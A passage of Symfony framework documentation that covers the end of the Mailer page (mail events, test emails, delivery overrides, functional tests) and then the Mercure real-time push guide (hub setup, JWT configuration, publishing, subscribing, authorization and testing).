        $message = $event->getMessage();
        if (!$message instanceof Email) {
            return;
        }
        // do something with the message (logging, ...)

        // and/or add some Messenger stamps
        $event->addStamp(new SomeMessengerStamp());
    }

If you want to stop the Message from being sent, call ``reject()`` (it will
also stop the event propagation)::

    use Symfony\Component\Mailer\Event\MessageEvent;

    public function onMessage(MessageEvent $event): void
    {
        $event->reject();
    }

Execute this command to find out which listeners are registered for this event
and their priorities:

.. code-block:: terminal

    $ php bin/console debug:event-dispatcher "Symfony\Component\Mailer\Event\MessageEvent"

SentMessageEvent
~~~~~~~~~~~~~~~~

**Event Class**: :class:`Symfony\\Component\\Mailer\\Event\\SentMessageEvent`

``SentMessageEvent`` allows you to act on the :class:`Symfony\\Component\\\Mailer\\\SentMessage`
class to access the original message (``getOriginalMessage()``) and some debugging
information (``getDebug()``) such as the HTTP calls made by the HTTP transports,
which is useful for debugging errors::

    use Symfony\Component\EventDispatcher\EventSubscriberInterface;
    use Symfony\Component\Mailer\Event\SentMessageEvent;
    use Symfony\Component\Mailer\SentMessage;

    public function onMessage(SentMessageEvent $event): void
    {
        $message = $event->getMessage();
        if (!$message instanceof SentMessage) {
            return;
        }

        // do something with the message
    }

Execute this command to find out which listeners are registered for this event
and their priorities:

.. code-block:: terminal

    $ php bin/console debug:event-dispatcher "Symfony\Component\Mailer\Event\SentMessageEvent"

FailedMessageEvent
~~~~~~~~~~~~~~~~~~

**Event Class**: :class:`Symfony\\Component\\Mailer\\Event\\FailedMessageEvent`

``FailedMessageEvent`` allows acting on the the initial message in case of a failure::

    use Symfony\Component\EventDispatcher\EventSubscriberInterface;
    use Symfony\Component\Mailer\Event\FailedMessageEvent;

    public function onMessage(FailedMessageEvent $event): void
    {
        // e.g you can get more information on this error when sending an email
        $event->getError();

        // do something with the message
    }

Execute this command to find out which listeners are registered for this event
and their priorities:

.. code-block:: terminal

    $ php bin/console debug:event-dispatcher "Symfony\Component\Mailer\Event\FailedMessageEvent"

Development & Debugging
-----------------------

.. _mail-catcher:

Enabling an Email Catcher
~~~~~~~~~~~~~~~~~~~~~~~~~

When developing locally, it is recommended to use an email catcher. If you have
enabled Docker support via Symfony recipes, an email catcher is automatically
configured. In addition, if you are using the :doc:`Symfony local web server
</setup/symfony_server>`, the mailer DSN is automatically exposed via the
:ref:`symfony binary Docker integration <symfony-server-docker>`.

Sending Test Emails
~~~~~~~~~~~~~~~~~~~

Symfony provides a command to send emails, which is useful during development
to test if sending emails works correctly:

.. code-block:: terminal

    # the only mandatory argument is the recipient address
    # (check the command help to learn about its options)
    $ php bin/console mailer:test someone@example.com

This command bypasses the :doc:`Messenger bus </messenger>`, if configured, to
ease testing emails even when the Messenger consumer is not running.

Disabling Delivery
~~~~~~~~~~~~~~~~~~

While developing (or testing), you may want to disable delivery of messages
entirely. You can do this by using ``null://null`` as the mailer DSN, either in
your :ref:`.env configuration files <configuration-multiple-env-files>` or in
the mailer configuration file (e.g. in the ``dev`` or ``test`` environments):

.. configuration-block::

    .. code-block:: yaml

        # config/packages/mailer.yaml
        when@dev:
            framework:
                mailer:
                    dsn: 'null://null'

    .. code-block:: xml

        <!-- config/packages/mailer.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <!-- ... -->
            <framework:config>
                <framework:mailer dsn="null://null"/>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/mailer.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            // ...
            $framework->mailer()
                ->dsn('null://null');
        };

.. note::

    If you're using Messenger and routing to a transport, the message will *still*
    be sent to that transport.

Always Send to the same Address
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Instead of disabling delivery entirely, you might want to *always* send emails to
a specific address, instead of the *real* address:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/mailer.yaml
        when@dev:
            framework:
                mailer:
                    envelope:
                        recipients: ['youremail@example.com']

    .. code-block:: xml

        <!-- config/packages/mailer.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <!-- ... -->
            <framework:config>
                <framework:mailer>
                    <framework:envelope>
                        <framework:recipient>youremail@example.com</framework:recipient>
                    </framework:envelope>
                </framework:mailer>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/mailer.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            // ...
            $framework->mailer()
                ->envelope()
                    ->recipients(['youremail@example.com'])
            ;
        };

Use the ``allowed_recipients`` option to specify exceptions to the behavior defined
in the ``recipients`` option; allowing emails directed to these specific recipients
to maintain their original destination:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/mailer.yaml
        when@dev:
            framework:
                mailer:
                    envelope:
                        recipients: ['youremail@example.com']
                        allowed_recipients:
                            - 'internal@example.com'
                            # you can also use regular expression to define allowed recipients
                            - 'internal-.*@example.(com|fr)'

    .. code-block:: xml

        <!-- config/packages/mailer.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <!-- ... -->
            <framework:config>
                <framework:mailer>
                    <framework:envelope>
                        <framework:recipient>youremail@example.com</framework:recipient>
                        <framework:allowed-recipient>internal@example.com</framework:allowed-recipient>
                        <!-- you can also use regular expression to define allowed recipients -->
                        <framework:allowed-recipient>internal-.*@example.(com|fr)</framework:allowed-recipient>
                    </framework:envelope>
                </framework:mailer>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/mailer.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            // ...
            $framework->mailer()
                ->envelope()
                    ->recipients(['youremail@example.com'])
                    ->allowedRecipients([
                        'internal@example.com',
                        // you can also use regular expression to define allowed recipients
                        'internal-.*@example.(com|fr)',
                    ])
            ;
        };

With this configuration, all emails will be sent to ``youremail@example.com``,
except for those sent to ``internal@example.com``, ``internal-monitoring@example.fr``,
etc., which will receive emails as usual.

.. versionadded:: 7.1

    The ``allowed_recipients`` option was introduced in Symfony 7.1.

Write a Functional Test
~~~~~~~~~~~~~~~~~~~~~~~

Symfony provides lots of :ref:`built-in mailer assertions <mailer-assertions>`
to functionally test that an email was sent, its contents or headers, etc.
They are available in test classes extending
:class:`Symfony\\Bundle\\FrameworkBundle\\Test\\KernelTestCase` or when using
the :class:`Symfony\\Bundle\\FrameworkBundle\\Test\\MailerAssertionsTrait`::

    // tests/Controller/MailControllerTest.php
    namespace App\Tests\Controller;

    use Symfony\Bundle\FrameworkBundle\Test\WebTestCase;

    class MailControllerTest extends WebTestCase
    {
        public function testMailIsSentAndContentIsOk(): void
        {
            $client = static::createClient();
            $client->request('GET', '/mail/send');
            $this->assertResponseIsSuccessful();

            $this->assertEmailCount(1); // use assertQueuedEmailCount() when using Messenger

            $email = $this->getMailerMessage();

            $this->assertEmailHtmlBodyContains($email, 'Welcome');
            $this->assertEmailTextBodyContains($email, 'Welcome');
        }
    }

.. tip::

   If your controller returns a redirect response after sending the email, make
   sure to have your client *not* follow redirects. The kernel is rebooted after
   following the redirection and the message will be lost from the mailer event
   handler.

.. _`Amazon SES`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/Amazon/README.md
.. _`Azure`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/Azure/README.md
.. _`App Password`: https://support.google.com/accounts/answer/185833
.. _`Brevo`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/Brevo/README.md
.. _`default_socket_timeout`: https://www.php.net/manual/en/filesystem.configuration.php#ini.default-socket-timeout
.. _`DKIM`: https://en.wikipedia.org/wiki/DomainKeys_Identified_Mail
.. _`download the foundation-emails.css file`: https://github.com/foundation/foundation-emails/blob/develop/dist/foundation-emails.css
.. _`Google Gmail`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/Google/README.md
.. _`high availability`: https://en.wikipedia.org/wiki/High_availability
.. _`Infobip`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/Infobip/README.md
.. _`Inky`: https://get.foundation/emails/docs/inky.html
.. _`league/html-to-markdown`: https://github.com/thephpleague/html-to-markdown
.. _`load balancing`: https://en.wikipedia.org/wiki/Load_balancing_(computing)
.. _`MailerSend`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/MailerSend/README.md
.. _`Mandrill`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/Mailchimp/README.md
.. _`Mailgun`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/Mailgun/README.md
.. _`Mailjet`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/Mailjet/README.md
.. _`Markdown syntax`: https://commonmark.org/
.. _`MailPace`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/MailPace/README.md
.. _`OpenSSL PHP extension`: https://www.php.net/manual/en/book.openssl.php
.. _`PEM encoded`: https://en.wikipedia.org/wiki/Privacy-Enhanced_Mail
.. _`Postmark`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/Postmark/README.md
.. _`Resend`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/Resend/README.md
.. _`RFC 3986`: https://www.ietf.org/rfc/rfc3986.txt
.. _`S/MIME`: https://en.wikipedia.org/wiki/S/MIME
.. _`Scaleway`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/Scaleway/README.md
.. _`SendGrid`: https://github.com/symfony/symfony/blob/{version}/src/Symfony/Component/Mailer/Bridge/Sendgrid/README.md
Pushing Data to Clients Using the Mercure Protocol
==================================================

Being able to broadcast data in real-time from servers to clients is a
requirement for many modern web and mobile applications.

Creating a UI reacting in live to changes made by other users
(e.g. a user changes the data currently browsed by several other users,
all UIs are instantly updated),
notifying the user when :doc:`an asynchronous job </messenger>` has been
completed or creating chat applications are among the typical use cases
requiring "push" capabilities.

Symfony provides a straightforward component, built on top of
`the Mercure protocol`_, specifically designed for this class of use cases.

Mercure is an open protocol designed from the ground up to publish updates from
server to clients. It is a modern and efficient alternative to timer-based
polling and to WebSocket.

Because it is built on top `Server-Sent Events (SSE)`_, Mercure is supported
out of the box in modern browsers (old versions of Edge and IE require
`a polyfill`_) and has `high-level implementations`_ in many programming
languages.

Mercure comes with an authorization mechanism,
automatic reconnection in case of network issues
with retrieving of lost updates, a presence API,
"connection-less" push for smartphones and auto-discoverability (a supported
client can automatically discover and subscribe to updates of a given resource
thanks to a specific HTTP header).

All these features are supported in the Symfony integration.

`In this recording`_ you can see how a Symfony web API leverages Mercure
and API Platform to update in live a React app and a mobile app (React Native)
generated using the API Platform client generator.

Installation
------------

Installing the Symfony Bundle
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Run this command to install the Mercure support:

.. code-block:: terminal

    $ composer require mercure

To manage persistent connections, Mercure relies on a Hub: a dedicated server
that handles persistent SSE connections with the clients.
The Symfony app publishes the updates to the hub, that will broadcast them to
clients.

Thanks to :doc:`the Docker integration of Symfony </setup/docker>`,
:ref:`Flex <symfony-flex>` proposes to install a Mercure hub.
Run ``docker-compose up`` to start the hub if you have chosen this option.

If you use the :doc:`Symfony Local Web Server </setup/symfony_server>`,
you must start it with the ``--no-tls`` option.

.. code-block:: terminal

    $ symfony server:start --no-tls -d

Running a Mercure Hub
~~~~~~~~~~~~~~~~~~~~~

.. raw:: html

    <object data="_images/mercure/hub.svg" type="image/svg+xml"
        alt="Flow diagram showing a Symfony app communicating with the Mercure Hub using a POST request, and the Mercure Hub using SSE to communicate to the clients."
    ></object>

If you use the Docker integration, a hub is already up and running,
and you can go straight to the next section.

Otherwise, and in production, you have to install a hub by yourself.
An official and open source (AGPL) Hub based on the Caddy web server
can be downloaded as a static binary from `Mercure.rocks`_.
A Docker image, a Helm chart for Kubernetes
and a managed, High Availability Hub are also provided.

Configuration
-------------

The preferred way to configure MercureBundle is using
:doc:`environment variables </configuration>`.

When MercureBundle has been installed, the ``.env`` file of your project
has been updated by the Flex recipe to include the available env vars.

Also, if you are using the Docker integration with the Symfony Local Web Server,
`Symfony Docker`_ or the `API Platform distribution`_,
the proper environment variables have been automatically set.
Skip straight to the next section.

Otherwise, set the URL of your hub as the value of the ``MERCURE_URL``
and ``MERCURE_PUBLIC_URL`` env vars.
Sometimes a different URL must be called by the Symfony app (usually to publish),
and the JavaScript client (usually to subscribe). It's especially common when
the Symfony app must use a local URL and the client-side JavaScript code a public one.
In this case, ``MERCURE_URL`` must contain the local URL used by the
Symfony app (e.g. ``https://mercure/.well-known/mercure``), and ``MERCURE_PUBLIC_URL``
the publicly available URL (e.g. ``https://example.com/.well-known/mercure``).

The clients must also bear a `JSON Web Token`_ (JWT)
to the Mercure Hub to be authorized to publish updates and, sometimes, to subscribe.

This token must be signed with the same secret key as the one used by the Hub to verify the JWT (``!ChangeThisMercureHubJWTSecretKey!`` if you use the Docker integration).
This secret key must be stored in the ``MERCURE_JWT_SECRET`` environment variable.
MercureBundle will use it to automatically generate and sign the needed JWTs.

In addition to these environment variables,
MercureBundle provides a more advanced configuration:

* ``secret``: the key to use to sign the JWT - A key of the same size as the hash output (for instance, 256 bits for "HS256") or larger MUST be used. (all other options, beside ``algorithm``, ``subscribe``, and ``publish`` will be ignored)
* ``publish``: a list of topics to allow publishing to when generating the JWT (only usable when ``secret``, or ``factory`` are provided)
* ``subscribe``: a list of topics to allow subscribing to when generating the JWT (only usable when ``secret``, or ``factory`` are provided)
* ``algorithm``: The algorithm to use to sign the JWT (only usable when ``secret`` is provided)
* ``provider``: The ID of a service to call to provide the JWT (all other options will be ignored)
* ``factory``: The ID of a service to call to create the JWT (all other options, beside ``subscribe``, and ``publish`` will be ignored)
* ``value``: the raw JWT to use (all other options will be ignored)

.. configuration-block::

    .. code-block:: yaml

        # config/packages/mercure.yaml
        mercure:
            hubs:
                default:
                    url: https://mercure-hub.example.com/.well-known/mercure
                    jwt:
                        secret: '!ChangeThisMercureHubJWTSecretKey!'
                        publish: ['foo', 'https://example.com/foo']
                        subscribe: ['bar', 'https://example.com/bar']
                        algorithm: 'hmac.sha256'
                        provider: 'My\Provider'
                        factory: 'My\Factory'
                        value: 'my.jwt'

    .. code-block:: xml

        <!-- config/packages/mercure.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <config>
            <hub
                name="default"
                url="https://mercure-hub.example.com/.well-known/mercure"
            >
                <jwt
                    secret="!ChangeThisMercureHubJWTSecretKey!"
                    algorithm="hmac.sha256"
                    provider="My\Provider"
                    factory="My\Factory"
                    value="my.jwt"
                >
                    <publish>foo</publish>
                    <publish>https://example.com/foo</publish>
                    <subscribe>bar</subscribe>
                    <subscribe>https://example.com/bar</subscribe>
                </jwt>
            </hub>
        </config>

    .. code-block:: php

        // config/packages/mercure.php
        $container->loadFromExtension('mercure', [
            'hubs' => [
                'default' => [
                    'url' => 'https://mercure-hub.example.com/.well-known/mercure',
                    'jwt' => [
                        'secret' => '!ChangeThisMercureHubJWTSecretKey!',
                        'publish' => ['foo', 'https://example.com/foo'],
                        'subscribe' => ['bar', 'https://example.com/bar'],
                        'algorithm' => 'hmac.sha256',
                        'provider' => 'My\Provider',
                        'factory' => 'My\Factory',
                        'value' => 'my.jwt',
                    ],
                ],
            ],
        ]);

.. tip::

    The JWT payload must contain at least the following structure for the client to be allowed to
    publish:

    .. code-block:: json

        {
            "mercure": {
                "publish": ["*"]
            }
        }

    The jwt.io website is a convenient way to create and sign JWTs, checkout this `example JWT`_.
    Don't forget to set your secret key properly in the bottom of the right panel of the form!

Basic Usage
-----------

Publishing
~~~~~~~~~~

The Mercure Component provides an ``Update`` value object representing
the update to publish. It also provides a ``Publisher`` service to dispatch
updates to the Hub.

The ``Publisher`` service can be injected using the
:doc:`autowiring </service_container/autowiring>` in any other
service, including controllers::

    // src/Controller/PublishController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Mercure\HubInterface;
    use Symfony\Component\Mercure\Update;

    class PublishController extends AbstractController
    {
        public function publish(HubInterface $hub): Response
        {
            $update = new Update(
                'https://example.com/books/1',
                json_encode(['status' => 'OutOfStock'])
            );

            $hub->publish($update);

            return new Response('published!');
        }
    }

The first parameter to pass to the ``Update`` constructor is
the **topic** being updated. This topic should be an `IRI`_
(Internationalized Resource Identifier, RFC 3987): a unique identifier
of the resource being dispatched.

Usually, this parameter contains the original URL of the resource
transmitted to the client, but it can be any string or `IRI`_,
and it doesn't have to be a URL that exists (similarly to XML namespaces).

The second parameter of the constructor is the content of the update.
It can be anything, stored in any format.
However, serializing the resource in a hypermedia format such as JSON-LD,
Atom, HTML or XML is recommended.

Subscribing
~~~~~~~~~~~

Subscribing to updates in JavaScript from a Twig template is straightforward:

.. code-block:: html+twig

    <script>
    const eventSource = new EventSource("{{ mercure('https://example.com/books/1')|escape('js') }}");
    eventSource.onmessage = event => {
        // Will be called every time an update is published by the server
        console.log(JSON.parse(event.data));
    }
    </script>

The ``mercure()`` Twig function generates the URL of the Mercure hub
according to the configuration. The URL includes the ``topic`` query
parameters corresponding to the topics passed as first argument.

If you want to access to this URL from an external JavaScript file, generate the
URL in a dedicated HTML element:

.. code-block:: html+twig

    <script type="application/json" id="mercure-url">
    {{ mercure('https://example.com/books/1')|json_encode(constant('JSON_UNESCAPED_SLASHES') b-or constant('JSON_HEX_TAG'))|raw }}
    </script>

Then retrieve it from your JS file:

.. code-block:: javascript

    const url = JSON.parse(document.getElementById("mercure-url").textContent);
    const eventSource = new EventSource(url);
    // ...

Mercure also allows subscribing to several topics,
and to use URI Templates or the special value ``*`` (matched by all topics)
as patterns:

.. code-block:: html+twig

    <script>
    {# Subscribe to updates of several Book resources and to all Review resources matching the given pattern #}
    const eventSource = new EventSource("{{ mercure([
        'https://example.com/books/1',
        'https://example.com/books/2',
        'https://example.com/reviews/{id}'
    ])|escape('js') }}");

    eventSource.onmessage = event => {
        console.log(JSON.parse(event.data));
    }
    </script>

.. tip::

    Google Chrome DevTools natively integrate a `practical UI`_ displaying in live
    the received events:

    .. image:: /_images/mercure/chrome.png
        :alt: The Chrome DevTools showing the EventStream tab containing information about each SSE event.

    To use it:

    * open the DevTools
    * select the "Network" tab
    * click on the request to the Mercure hub
    * click on the "EventStream" sub-tab.

.. tip::

    Test if a URI Template match a URL using `the online debugger`_

Discovery
---------

The Mercure protocol comes with a discovery mechanism.
To leverage it, the Symfony application must expose the URL of the Mercure Hub
in a ``Link`` HTTP header.

.. raw:: html

    <object data="_images/mercure/discovery.svg" type="image/svg+xml"
        alt="Flow diagram showing the Link response header set by the Symfony app to respond to an API request for a book with ID 1."
    ></object>

You can create ``Link`` headers with the ``Discovery`` helper class
(under the hood, it uses the :doc:`WebLink Component </web_link>`)::

    // src/Controller/DiscoverController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\JsonResponse;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\Mercure\Discovery;

    class DiscoverController extends AbstractController
    {
        public function discover(Request $request, Discovery $discovery): JsonResponse
        {
            // Link: <https://hub.example.com/.well-known/mercure>; rel="mercure"
            $discovery->addLink($request);

            return $this->json([
                '@id' => '/books/1',
                'availability' => 'https://schema.org/InStock',
            ]);
        }
    }

Then, this header can be parsed client-side to find the URL of the Hub,
and to subscribe to it:

.. code-block:: javascript

    // Fetch the original resource served by the Symfony web API
    fetch('/books/1') // Has Link: <https://hub.example.com/.well-known/mercure>; rel="mercure"
        .then(response => {
            // Extract the hub URL from the Link header
            const hubUrl = response.headers.get('Link').match(/<([^>]+)>;\s+rel=(?:mercure|"[^"]*mercure[^"]*")/)[1];

            // Append the topic(s) to subscribe as query parameter
            const hub = new URL(hubUrl, window.origin);
            hub.searchParams.append('topic', 'https://example.com/books/{id}');

            // Subscribe to updates
            const eventSource = new EventSource(hub);
            eventSource.onmessage = event => console.log(event.data);
        });

Authorization
-------------

Mercure also allows dispatching updates only to authorized clients.
To do so, mark the update as **private** by setting the third parameter
of the ``Update`` constructor to ``true``::

    // src/Controller/Publish.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Mercure\Update;

    class PublishController extends AbstractController
    {
        public function publish(HubInterface $hub): Response
        {
            $update = new Update(
                'https://example.com/books/1',
                json_encode(['status' => 'OutOfStock']),
                true // private
            );

            // Publisher's JWT must contain this topic, a URI template it matches or * in mercure.publish or you'll get a 401
            // Subscriber's JWT must contain this topic, a URI template it matches or * in mercure.subscribe to receive the update
            $hub->publish($update);

            return new Response('private update published!');
        }
    }

To subscribe to private updates, subscribers must provide to the Hub
a JWT containing a topic selector matching by the topic of the update.

To provide this JWT, the subscriber can use a cookie,
or an ``Authorization`` HTTP header.

Cookies can be set automatically by Symfony by passing the appropriate options
to the ``mercure()`` Twig function. Cookies set by Symfony are automatically
passed by the browsers to the Mercure hub if the ``withCredentials`` attribute
of the ``EventSource`` class is set to ``true``. Then, the Hub verifies the
validity of the provided JWT, and extract the topic selectors from it.

.. code-block:: html+twig

    <script>
    const eventSource = new EventSource("{{ mercure('https://example.com/books/1', { subscribe: 'https://example.com/books/1' })|escape('js') }}", {
        withCredentials: true
    });
    </script>

The supported options are:

* ``subscribe``: the list of topic selectors to include in the ``mercure.subscribe`` claim of the JWT
* ``publish``: the list of topic selectors to include in the ``mercure.publish`` claim of the JWT
* ``additionalClaims``: extra claims to include in the JWT (expiration date, token ID...)

Using cookies is the most secure and preferred way when the client is a web
browser. If the client is not a web browser, then using an authorization header
is the way to go.

.. caution::

    To use the cookie authentication method, the Symfony app and the Hub
    must be served from the same domain (can be different sub-domains).

.. tip::

    The native implementation of EventSource doesn't allow specifying headers.
    For example, authorization using a Bearer token. In order to achieve that, use `a polyfill`_

    .. code-block:: html+twig

        <script>
        const es = new EventSourcePolyfill("{{ mercure('https://example.com/books/1') }}", {
            headers: {
                'Authorization': 'Bearer ' + token,
            }
        });
        </script>

Programmatically Setting The Cookie
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Sometimes, it can be convenient to set the authorization cookie from your code
instead of using the Twig function. MercureBundle provides a convenient service,
``Authorization``, to do so.

In the following example controller, the added cookie contains a JWT, itself
containing the appropriate topic selector.

And here is the controller::

    // src/Controller/DiscoverController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\JsonResponse;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\Mercure\Authorization;
    use Symfony\Component\Mercure\Discovery;

    class DiscoverController extends AbstractController
    {
        public function publish(Request $request, Discovery $discovery, Authorization $authorization): JsonResponse
        {
            $discovery->addLink($request);
            $authorization->setCookie($request, ['https://example.com/books/1']);

            return $this->json([
                '@id' => '/demo/books/1',
                'availability' => 'https://schema.org/InStock'
            ]);
        }
    }

.. tip::

    You cannot use the ``mercure()`` helper and the ``setCookie()``
    method at the same time (it would set the cookie twice on a single request). Choose
    either one method or the other.

Programmatically Generating The JWT Used to Publish
---------------------------------------------------

Instead of directly storing a JWT in the configuration,
you can create a token provider that will return the token used by
the ``HubInterface`` object::

    // src/Mercure/MyTokenProvider.php
    namespace App\Mercure;

    use Symfony\Component\Mercure\Jwt\TokenProviderInterface;

    final class MyTokenProvider implements TokenProviderInterface
    {
        public function getJwt(): string
        {
            return 'the-JWT';
        }
    }

Then, reference this service in the bundle configuration:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/mercure.yaml
        mercure:
            hubs:
                default:
                    url: https://mercure-hub.example.com/.well-known/mercure
                    jwt:
                        provider: App\Mercure\MyTokenProvider

    .. code-block:: xml

        <!-- config/packages/mercure.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <config>
            <hub
                name="default"
                url="https://mercure-hub.example.com/.well-known/mercure"
            >
                <jwt provider="App\Mercure\MyTokenProvider"/>
            </hub>
        </config>

    .. code-block:: php

        // config/packages/mercure.php
        use App\Mercure\MyJwtProvider;

        $container->loadFromExtension('mercure', [
            'hubs' => [
                'default' => [
                    'url' => 'https://mercure-hub.example.com/.well-known/mercure',
                    'jwt' => [
                        'provider' => MyJwtProvider::class,
                    ],
                ],
            ],
        ]);

This method is especially convenient when using tokens having an expiration
date, that can be refreshed programmatically.

Web APIs
--------

When creating a web API, it's convenient to be able to instantly push
new versions of the resources to all connected devices, and to update
their views.

API Platform can use the Mercure Component to dispatch updates automatically,
every time an API resource is created, modified or deleted.

Start by installing the library using its official recipe:

.. code-block:: terminal

    $ composer require api

Then, creating the following entity is enough to get a fully-featured
hypermedia API, and automatic update broadcasting through the Mercure hub::

    // src/Entity/Book.php
    namespace App\Entity;

    use ApiPlatform\Core\Annotation\ApiResource;
    use Doctrine\ORM\Mapping as ORM;

    #[ApiResource(mercure: true)]
    #[ORM\Entity]
    class Book
    {
        #[ORM\Id]
        #[ORM\Column]
        public string $name = '';

        #[ORM\Column]
        public string $status = '';
    }

As showcased `in this recording`_, the API Platform Client Generator also
allows to scaffold complete React and React Native applications from this API.
These applications will render the content of Mercure updates in real-time.

Checkout `the dedicated API Platform documentation`_ to learn more about
its Mercure support.

Testing
-------

During unit testing it's usually not needed to send updates to Mercure.

You can instead make use of the ``MockHub`` class::

    // tests/FunctionalTest.php
    namespace App\Tests\Unit\Controller;

    use App\Controller\MessageController;
    use Symfony\Component\Mercure\HubInterface;
    use Symfony\Component\Mercure\JWT\StaticTokenProvider;
    use Symfony\Component\Mercure\MockHub;
    use Symfony\Component\Mercure\Update;

    class MessageControllerTest extends TestCase
    {
        public function testPublishing(): void
        {
            $hub = new MockHub('https://internal/.well-known/mercure', new StaticTokenProvider('foo'), function(Update $update): string {
                // $this->assertTrue($update->isPrivate());

                return 'id';
            });

            $controller = new MessageController($hub);

            // ...
        }
    }

For functional testing, you can instead create a stub of the Hub::

    // tests/Functional/Stub/HubStub.php
    namespace App\Tests\Functional\Stub;

    use Symfony\Component\Mercure\HubInterface;
    use Symfony\Component\Mercure\Update;

    class HubStub implements HubInterface
    {
        public function publish(Update $update): string
        {
            return 'id';
        }

        // implement rest of HubInterface methods here
    }

Use ``HubStub`` to replace the default hub service so no updates are actually
sent:

.. code-block:: yaml

    # config/services_test.yaml
    mercure.hub.default:
        class: App\Tests\Functional\Stub\HubStub

As MercureBundle support multiple hubs, you may have to replace
the other service definitions accordingly.

.. tip::

    Symfony Panther has `a feature to test applications using Mercure`_.

Debugging
---------

.. versionadded:: 0.2

    The WebProfiler panel was introduced in MercureBundle 0.2.

Enable the panel in your configuration, as follows:

MercureBundle is shipped with a debug panel. Install the Debug pack to
enable it::

.. code-block:: terminal

    $ composer require --dev symfony/debug-pack

.. image:: /_images/mercure/panel.png
    :alt: The Mercure panel of the Symfony Profiler, showing information like time, memory, topics and data of each message sent by Mercure.
    :class: with-browser

Async dispatching
-----------------

.. tip::

    Async dispatching is discouraged. Most Mercure hubs already
    handle publications asynchronously and using Messenger is
    usually not necessary.

Instead of calling the ``Publisher`` service directly, you can also let Symfony
dispatching the updates asynchronously thanks to the provided integration with
the Messenger component.

First, be sure :doc:`to install the Messenger component </messenger>`
and to configure properly a transport (if you don't, the handler will
be called synchronously).

Then, dispatch the Mercure ``Update`` to the Messenger's Message Bus,
it will be handled automatically::

    // src/Controller/PublishController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Mercure\Update;
    use Symfony\Component\Messenger\MessageBusInterface;

    class PublishController extends AbstractController
    {
        public function publish(MessageBusInterface $bus): Response
        {
            $update = new Update(
                'https://example.com/books/1',
                json_encode(['status' => 'OutOfStock'])
            );

            // Sync, or async (Doctrine, RabbitMQ, Kafka...)
            $bus->dispatch($update);

            return new Response('published!');
        }
    }

Going further
-------------

* The Mercure protocol is also supported by :doc:`the Notifier component </notifier>`.
  Use it to send push notifications to web browsers.
* `Symfony UX Turbo`_ is a library using Mercure to provide the same experience
  as with Single Page Applications but without having to write a single line of JavaScript!

.. _`the Mercure protocol`: https://mercure.rocks/spec
.. _`Server-Sent Events (SSE)`: https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events
.. _`a polyfill`: https://github.com/Yaffle/EventSource
.. _`high-level implementations`: https://mercure.rocks/docs/ecosystem/awesome
.. _`In this recording`: https://www.youtube.com/watch?v=UI1l0JOjLeI
